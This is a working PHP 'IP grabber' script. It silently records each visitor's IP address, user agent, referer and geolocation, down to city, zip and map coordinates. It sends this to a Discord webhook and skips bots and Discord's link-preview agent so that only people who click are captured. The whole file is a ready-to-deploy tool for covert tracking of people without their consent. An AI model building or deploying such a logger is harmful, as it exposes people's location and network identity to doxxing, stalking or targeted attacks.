<?php

/* 
Please keep this copyright statement intact
Creator: Jeroenimo02#2380
Publish Date: 19-03-2021
Last Update: 13-10-2024
APIs Provided By: geoiplookup.io and ip-api.com
*/ 

// Get the visitor's IP
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];
$Referer = isset($_SERVER['HTTP_REFERER'])? $_SERVER['HTTP_REFERER'] : 'N/A'; // Coleta do Referer

// Stop the bots from logging
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

// Cloudflare Bypass
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    // Cloudflare
    $IP = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // CloudFront
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    // Default fallback
    $IP = $_SERVER['REMOTE_ADDR'];
}

// Set timezone
date_default_timezone_set("Europe/Amsterdam");
$Date = date('d/m/Y');
$Time = date('G:i:s');

// Check if IP is a VPN
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

// Set variables
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;
$Details->countryCode = strtolower($Details->countryCode);
$Flag = "https://countryflagsapi.com/png/{$Details->countryCode}";

class Discord
{
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag, $Referer; // Inclui Referer na lista de variáveis globais

        // Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
        $Webhook = "YOUR_WEBHOOK_HERE";

        $InfoArr = array(
            "username" => "$WebhookName",
            "avatar_url" => "$Flag",
            "embeds" => array(
                array(
                    "title" => "Visitor From $Country",
                    "color" => "39423",
                    "fields" => array(
                        array(
                            "name" => "IP",
                            "value" => "$IP",
                            "inline" => true
                        ),
                        array(
                            "name" => "VPN?",
                            "value" => "$VPN",
                            "inline" => true
                        ),
                        array(
                            "name" => "Useragent",
                            "value" => "$Browser"
                        ),
                        array(
                            "name" => "Referer",
                            "value" => "$Referer", // Include the referer
                            "inline" => true
                        ),
                        array(
                            "name" => "Country/CountryCode",
                            "value" => "$Country/$CountryCode",
                            "inline" => true
                        ),
                        array(
                            "name" => "Region | City | Zip",
                            "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                            "inline" => true
                        )
                    ),
                    "footer" => array(
                        "text" => "$Date $Time",
                        "icon_url" => "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                    )
                )
            )
        );

        // Call the function to send data
        $this->sendData($Webhook, $InfoArr);
    }

    private function sendData($webhook, $infoArr)
    {
        $JSON = json_encode($infoArr);
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => $JSON
            )
        ));

        // Use file_get_contents() to send the data
        return file_get_contents($webhook, false, $context);
    }
}

// Create an instance of the Discord class
$discord = new Discord();
// Call the Visitor method
$discord->Visitor();
?>
